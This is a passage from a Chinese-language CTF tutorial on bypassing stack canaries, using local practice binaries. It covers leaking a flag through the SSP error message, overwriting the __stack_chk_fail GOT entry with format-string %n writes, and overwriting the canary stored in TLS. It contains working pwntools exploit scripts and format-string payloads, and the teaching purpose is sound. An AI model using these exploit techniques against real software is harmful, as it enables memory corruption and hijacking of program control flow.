"/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/36.png" alt="image-20210406215520252"></p><p>地址是<strong>0x40080E</strong>，我们只需要在这个位置下个断点，看RSP的值即可</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/37.png" alt="image-20210406220110587"></p><p>所以偏移值为<strong>0x7fffffffded8 - 0x7fffffffdcc0 &#x3D; 0x218</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find CTF</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">&#x27;CTF&#x27;</span> in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">smashes : <span class="number">0x400d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br><span class="line">smashes : <span class="number">0x600d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>接着找到flag的值，但是看上文中有两个值，我们直接是用<strong>0x400d21</strong>这个值</p><div class="note default modern"><p>据网上的WP说法，ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射，留个坑后面填</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_main_func_addr = <span class="number">0x7fffffffded8</span></span><br><span class="line">get_io_gets_func_addr = <span class="number">0x7fffffffdcc0</span></span><br><span class="line">flag_addr = <span class="number">0x400d21</span></span><br><span class="line">offset=get_main_func_addr - get_io_gets_func_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] offset is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(offset)))</span><br><span class="line">payload = (<span class="string">&quot;A&quot;</span> * offset).encode() + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以看到最终我们输出了flag的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/38.png" alt="image-20210406222753429"></p><h3 id="劫持stack-chk-fail函数"><a href="#劫持stack-chk-fail函数" class="headerlink" title="劫持stack_chk_fail函数"></a>劫持stack_chk_fail函数</h3><p>从SSP中我们可以得知Canary失败的处理逻辑会进入到 __stack_chk_failed函数，__stack_chk_failed函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h4 id="漏洞存在点"><a href="#漏洞存在点" class="headerlink" title="漏洞存在点"></a>漏洞存在点</h4><p>格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，printf函数它并不知道自己现在的参数个数有几个，但是它的内部却有个指针用来索检格式化字符串。对于遇到特定类型%，就去执行取相应参数的值，直到索检到格式化字符串结束。如果printf语句没有带格式化字符参数的话，那么就一定存在格式化字符串漏洞。</p><h4 id="格式化字符"><a href="#格式化字符" class="headerlink" title="格式化字符"></a>格式化字符</h4><table><thead><tr><th align="left">格式字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="left">d</td><td align="center">以十进制形式输出带符号整数(正数不输出符号)</td></tr><tr><td align="left">o</td><td align="center">以八进制形式输出无符号整数(不输出前缀0)</td></tr><tr><td align="left">x</td><td align="center">以十六进制形式输出无符号整数(不输出前缀Ox)</td></tr><tr><td align="left">u</td><td align="center">以十进制形式输出无符号整数</td></tr><tr><td align="left">f</td><td align="center">以小数形式输出单、双精度实数</td></tr><tr><td align="left">e</td><td align="center">以指数形式输出单、双精度实数</td></tr><tr><td align="left">g</td><td align="center">以%f或%e中较短的输出宽度输出单、双精度实数</td></tr><tr><td align="left">c</td><td align="center">输出单个字符</td></tr><tr><td align="left">s</td><td align="center">输出字符串</td></tr><tr><td align="left">p</td><td align="center">输出指针地址，可以用来计算格式化字符的偏移</td></tr><tr><td align="left">n</td><td align="center">将%n之前已经打印的字符个数赋值给偏移处指针所指向的地址位置</td></tr></tbody></table><ul><li>%hhn 向某地址写入1字节</li><li>%hn 向某个地址写入2字节</li><li>%n 向某个地址写入4字节</li><li>%lln 向某地址写入8字节</li></ul><h4 id="漏洞的利用手段"><a href="#漏洞的利用手段" class="headerlink" title="漏洞的利用手段"></a>漏洞的利用手段</h4><ul><li><p>搞破坏，使程序崩溃。</p><p>因为%s对应的参数地址不合法的概率还是比较大的。所以直接输入无数个%s让其遇到不合法地址然后崩溃。</p></li><li><p>泄露内存</p><p>泄露栈内容：获取某个变量的值；获取某个变量对应地址的内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$x : 返回栈上第（n+1）个参数的值</span><br><span class="line">64bit：   %n$p 或者 %n$llx (64bit) ：返回栈上第（n-5）个参数的值</span><br></pre></td></tr></table></figure><p>泄露任意地址内存：利用got表得到libc函数地址，进而获取其他libc函数地址；盲目地dump整个程序，获取有用信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$s：把栈上第n+1个参数的值作为地址，返回该地址内存的值</span><br><span class="line">64bit：   %n$s：把栈上第n-5个参数的值作为地址，返回该地址内存的值</span><br></pre></td></tr></table></figure></li><li><p>修改内存数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%***c%n$n：  把栈上第n+1个参数的值作为地址，将该地址的高32bit值改为 hex(***)</span><br><span class="line">%***c%n$hn： 把栈上第n+1个参数的值作为地址，将该地址的高16bit值改为 hex(***)</span><br><span class="line">%***c%n$hhn：把栈上第n+1个参数的值作为地址，将该地址的高8bit值改为 hex(***)</span><br><span class="line">[64bit下，（n+1）变为（n-5）即可 ]</span><br></pre></td></tr></table></figure></li></ul><h4 id="控制符-n-的利用"><a href="#控制符-n-的利用" class="headerlink" title="控制符 %n 的利用"></a>控制符 %n 的利用</h4><p>在格式化控制符中有一个 %n ，它用于把当前输出的所有数据的长度写回一个变量中去。</p><p>由于可能会造成溢出漏洞从而进程被恶意代码劫持，现如今该控制符貌似很早之前就被弃用了。<br>现在只有在 vc 6.0++ 和 linux 上还可以用。</p><p>举一个栗子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%n\n&quot;</span>,&amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,length);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//5</span></span><br></pre></td></tr></table></figure><p>该程序首先会输出 hello ，然后把字符串长度5存回 &amp;length变量里，第二次输出length变量的值即是5。</p><h5 id="任意地址写-32位"><a href="#任意地址写-32位" class="headerlink" title="任意地址写(32位)"></a>任意地址写(32位)</h5><p>32位的地址在前面，64位的地址在后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(system_addr)+ <span class="string">&#x27;%012c&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>举个栗子方便理解</p><p>比如payload为 <code>\x8c\x97\x04\x08%2048c%5$n</code> ，那么我们就可以把<strong>0x0804978c</strong>地址里的内容修改为**0x804 **（2048+4字节）</p></li><li><p>再举个栗子</p><p>例如要把printf的地址 修改为 system地址。我们采取单字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf_got=<span class="number">0x08049778</span>  </span><br><span class="line">system_plt=<span class="number">0x08048320</span></span><br><span class="line">payload=p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)+p32(printf_got+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x20</span>-<span class="number">16</span>)+<span class="string">&quot;c%5$hhn&quot;</span>  </span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83</span>-<span class="number">0x20</span>)+<span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x104</span>-<span class="number">0x83</span>)+<span class="string">&quot;c%7$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>-<span class="number">0x04</span>)+<span class="string">&quot;c%8$hhn&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="任意地址写-64位"><a href="#任意地址写-64位" class="headerlink" title="任意地址写(64位)"></a>任意地址写(64位)</h5><p>下面题目的EXP，我们采取2字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(stack_chk_fail+<span class="number">2</span>) + p64(stack_chk_fail)</span><br></pre></td></tr></table></figure><p>具体解释看题解内容即可</p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p><a href="http://www.int0x80.top/BypassCanary/r2t4">题目地址</a>    <a href="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/r2t4">备用地址</a></p><p>从IDA中可以看到main函数有Canary保护</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/39.png" alt="image-20210409000213211"></p><p>并且函数中有格式化字符串漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在后门函数backdoor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们看下格式化字符的偏移，运行程序输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br></pre></td></tr></table></figure><p>可以看到输出内容，我们的41414141在第六个参数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ./r2t4 </span><br><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAA0x7ffeaa5d0250<span class="number">.0</span>x38<span class="number">.0</span>x7fa6a53fe320<span class="number">.0</span>x400730<span class="number">.0</span>x7fa6a56e1af0<span class="number">.0</span>x252e702541414141<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x70252e70252e7025<span class="number">.0</span>x252e70252e70252e<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x87ab0a70252e7025<span class="number">.0</span>x4006c0<span class="number">.0</span>x7fa6a5327840<span class="number">.0</span>x1</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./r2t4 terminated</span><br><span class="line">���@Aborted (core dumped)</span><br></pre></td></tr></table></figure><p>接着从IDA中找到后门函数的地址，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function name| Segment |      Start      | Length  |</span><br><span class="line">  backdoor     .text  0000000000400626  00000038</span><br></pre></td></tr></table></figure><p>那我们可以直接写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400626</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] __stack_chk_fail is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(__stack_chk_fail)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] __stack_chk_fail high is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail+<span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] __stack_chk_fail low is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail)))</span><br><span class="line">payload=<span class="string">b&#x27;%64c%9$hn%1510c%10$hnAAA&#x27;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>backdoor的地址是0x400626，利用格式化字符串漏洞把 __stack_chk_fail 的地址覆盖掉<br><code>%64c</code>：0x40，替换backdoor的两位高字节0x0040<br><code>%64c%9$hn%1510c%10$hnAAA</code>：占24个字符，24&#x2F;8&#x3D;3，偏移为6+3&#x3D;9（之前算出的第六个参数中）<br><code>$hn</code>：向某个地址写入双字节<br><code>%1510c</code>：1510+64&#x3D;0x0626,替换backdoor的两位高字节0x0626<br><code>AAA</code>：是填充字符，填充到8的倍数<br><code>__stack_chk_fail+2</code>和<code>__stack_chk_fail</code>分别替换成backdoor的高两位字节和低两位字节</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/40.png" alt="image-20210409035655552"></p><p>输出了我们之前做题写的flag文件内容</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>通常在C程序中常存在全局变量、静态变量以及局部变量，对于局部变量来说，并不存在线程安全问题。而对于全局变量和函数内定义的静态变量，同一进程中各个线程都可以访问它们，因此它们存在多线程读写问题。</p><p>如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/41.png" alt="1" style="zoom:50%;" /><h4 id="Glibc中设置Canary的过程"><a href="#Glibc中设置Canary的过程" class="headerlink" title="Glibc中设置Canary的过程"></a>Glibc中设置Canary的过程</h4><p>从glibc源码中可以看到，定义了<code>THREAD_SET_STACK_GUARD</code>时，Canary通过这个宏被设置；否则存入全局变量<code>__stack_chk_guard</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>进一步查看<code>THREAD_SET_STACK_GUARD</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">    THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure><p>查看<code>THREAD_SETMEM</code>，可以看到这个宏通过内联汇编，将<code>vlaue</code>，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过<code>offsetof</code>宏得到的<code>pthread</code>结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员<code>header.stack_guard</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> THREAD_SETMEM(descr, member, value) </span></span><br><span class="line">  (&#123; <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">1</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movb %b0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : <span class="string">&quot;iq&quot;</span> (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (<span class="keyword">struct</span> pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">4</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movl %0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : IMM_MODE (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (<span class="keyword">struct</span> pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span>      </span><br><span class="line">       &#123;      </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) != <span class="number">8</span>)      </span><br><span class="line">   <span class="comment">/* There should not be any value with a size other than 1,    </span></span><br><span class="line"><span class="comment">      4 or 8.  */</span>      </span><br><span class="line">   <span class="built_in">abort</span> ();      </span><br><span class="line">      </span><br><span class="line"> <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movq %q0,%%fs:%P1&quot;</span> :      </span><br><span class="line">       : IMM_MODE ((<span class="type">uint64_t</span>) cast_to_integer (value)),      </span><br><span class="line"> <span class="string">&quot;i&quot;</span> (offsetof (<span class="keyword">struct</span> pthread, member)));      </span><br><span class="line">       &#125;&#125;)</span><br></pre></td></tr></table></figure><p><code>pthread</code>是一个超大的结构体，这里略去余下部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="type">tcbhead_t</span> header;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Canary正是存储在<code>tcbhead_t</code>中的<code>stack_guard</code>，根据变量类型可以计算出在32位和64位上的偏移：</p><p>32位 gs:0x14 （0x4×3+0x4×3+0x4）</p><p>64位 fs:0x28（0x8×3+0x4×3+0x8）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><a href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">题目地址</a> <a href="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/libc-2.23.so">libc-2.23.so下载</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//babystack.c</span></span><br><span class="line"><span class="comment">//gcc -fstack-protector-strong -s -pthread babystack.c -o babystack -Wl,-z,now,-z,relro</span></span><br><span class="line"><span 